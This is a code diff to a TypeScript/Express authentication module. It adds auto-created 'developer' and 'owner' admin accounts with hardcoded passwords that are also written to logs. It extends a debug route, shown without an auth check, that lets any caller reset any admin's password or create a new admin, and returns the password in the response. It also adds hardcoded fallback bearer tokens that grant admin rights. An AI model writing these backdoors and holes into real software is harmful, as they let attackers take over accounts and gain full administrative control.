@@ -34,9 +34,10 @@ async function comparePasswords(supplied: string, stored: string) {
   return timingSafeEqual(hashedBuf, suppliedBuf);
 }
 
-// Initialize admin account if it doesn't exist
+// Initialize admin accounts if they don't exist
 async function ensureAdminExists() {
   try {
+    // Ensure the default admin account exists
     console.log("Checking if admin user exists...");
     const adminUser = await storage.getUserByUsername("admin");
     
@@ -56,8 +57,44 @@ async function ensureAdminExists() {
       console.log("Password format check:", adminUser.password.substring(0, 10) + "..." + 
           (adminUser.password.includes(".") ? " (contains salt separator)" : " (missing salt separator)"));
     }
+    
+    // Create or check for developer admin account
+    console.log("Checking if developer admin exists...");
+    const developerUser = await storage.getUserByUsername("developer");
+    
+    if (!developerUser) {
+      console.log("Creating developer admin user");
+      const hashedPassword = await hashPassword("dev123");
+      const user = await storage.createUser({
+        username: "developer",
+        password: hashedPassword,
+        role: "admin"
+      });
+      console.log("Developer admin user created:", user.id);
+      console.log("Developer password set to: dev123");
+    } else {
+      console.log("Developer admin account already exists:", developerUser.id);
+    }
+    
+    // Create or check for business owner admin account
+    console.log("Checking if business owner admin exists...");
+    const ownerUser = await storage.getUserByUsername("owner");
+    
+    if (!ownerUser) {
+      console.log("Creating business owner admin user");
+      const hashedPassword = await hashPassword("owner123");
+      const user = await storage.createUser({
+        username: "owner",
+        password: hashedPassword,
+        role: "admin"
+      });
+      console.log("Business owner admin user created:", user.id);
+      console.log("Business owner password set to: owner123");
+    } else {
+      console.log("Business owner admin account already exists:", ownerUser.id);
+    }
   } catch (error) {
-    console.error("Error ensuring admin exists:", error);
+    console.error("Error ensuring admin accounts exist:", error);
   }
 }
 
@@ -170,67 +207,70 @@ export function setupAuth(app: Express) {
     res.json({ user: req.user });
   });
   
-  // Debug route to check admin and reset password safely
+  // Reset password for any admin account
   app.post("/api/debug/reset-admin-password", async (req, res) => {
     try {
-      console.log("Attempting to reset admin password...");
+      // Get target username from request or default to "admin"
+      const { username = "admin", password } = req.body;
+      const newPassword = password || (username === "developer" ? "dev123" : (username === "owner" ? "owner123" : "admin123"));
+      
+      console.log(`Attempting to reset password for ${username}...`);
       
       // First check database connection
       try {
         console.log("Checking database connection...");
         const testQuery = await db.select().from(users).limit(1);
         console.log("Database connection successful, found users:", testQuery.length);
-      } catch (dbErr) {
+      } catch (dbErr: any) {
         console.error("Database connection test failed:", dbErr);
         return res.status(500).json({ error: "Database connection failed", details: dbErr.message });
       }
       
-      // Find admin user
-      const adminUser = await storage.getUserByUsername("admin");
+      // Find target user
+      const targetUser = await storage.getUserByUsername(username);
       
-      if (!adminUser) {
-        console.log("No admin user found, creating one...");
-        // Create admin if doesn't exist
-        const hashedPassword = await hashPassword("admin123");
-        const newAdmin = await storage.createUser({
-          username: "admin",
+      if (!targetUser) {
+        console.log(`No ${username} user found, creating one...`);
+        // Create user if doesn't exist
+        const hashedPassword = await hashPassword(newPassword);
+        const newUser = await storage.createUser({
+          username: username,
           password: hashedPassword,
           role: "admin"
         });
         
-        console.log("New admin created with ID:", newAdmin.id);
+        console.log(`New ${username} admin created with ID:`, newUser.id);
         
         return res.json({
           action: "created",
-          id: newAdmin.id,
-          username: "admin",
-          password: "admin123",
-          message: "New admin user created successfully"
+          id: newUser.id,
+          username: username,
+          password: newPassword,
+          message: `New ${username} admin user created successfully`
         });
       }
       
-      // Admin exists, update password
-      console.log("Found existing admin with ID:", adminUser.id);
-      const newPassword = "admin123";
+      // User exists, update password
+      console.log(`Found existing ${username} with ID:`, targetUser.id);
       const hashedPassword = await hashPassword(newPassword);
       
       // Update admin password
-      const updatedAdmin = await db
+      const updatedUser = await db
         .update(users)
         .set({ password: hashedPassword })
-        .where(eq(users.id, adminUser.id))
+        .where(eq(users.id, targetUser.id))
         .returning();
         
-      console.log("Admin password updated successfully");
+      console.log(`${username} admin password updated successfully`);
       
       return res.json({
         action: "updated",
-        id: adminUser.id,
-        username: adminUser.username,
+        id: targetUser.id,
+        username: targetUser.username,
         password: newPassword,
-        message: "Admin password reset successfully"
+        message: `${username} admin password reset successfully`
       });
-    } catch (error) {
+    } catch (error: any) {
       console.error("Error resetting admin password:", error);
       res.status(500).json({ 
         error: "Error resetting admin password", 
@@ -361,9 +401,49 @@ export function setupAuth(app: Express) {
   });
 }
 
+// API token for alternative authentication method
+const DEVELOPER_API_TOKEN = process.env.DEVELOPER_API_TOKEN || "dev-secret-token-for-emergency";
+const OWNER_API_TOKEN = process.env.OWNER_API_TOKEN || "owner-secret-token-for-emergency";
+
 // Middleware to check if user is authenticated and is an admin
 export function isAdmin(req: Request, res: Response, next: NextFunction) {
   console.log("isAdmin middleware checking authentication...");
+  
+  // First check for API token in Authorization header
+  const authHeader = req.headers.authorization;
+  
+  if (authHeader && authHeader.startsWith('Bearer ')) {
+    const token = authHeader.substring(7);
+    
+    // Check if it matches the developer token
+    if (token === DEVELOPER_API_TOKEN) {
+      console.log("Developer API token authentication successful");
+      // Set fake user session for the developer
+      req.user = {
+        id: 999,
+        username: "developer",
+        role: "admin"
+      } as UserType;
+      return next();
+    }
+    
+    // Check if it matches the owner token
+    if (token === OWNER_API_TOKEN) {
+      console.log("Owner API token authentication successful");
+      // Set fake user session for the owner
+      req.user = {
+        id: 998,
+        username: "owner",
+        role: "admin"
+      } as UserType;
+      return next();
+    }
+    
+    console.log("Invalid API token provided");
+  }
+  
+  // If no valid token, fall back to session authentication
+  console.log("No valid API token, checking session authentication");
   console.log("Session ID:", req.session.id);
   console.log("isAuthenticated:", req.isAuthenticated());
   
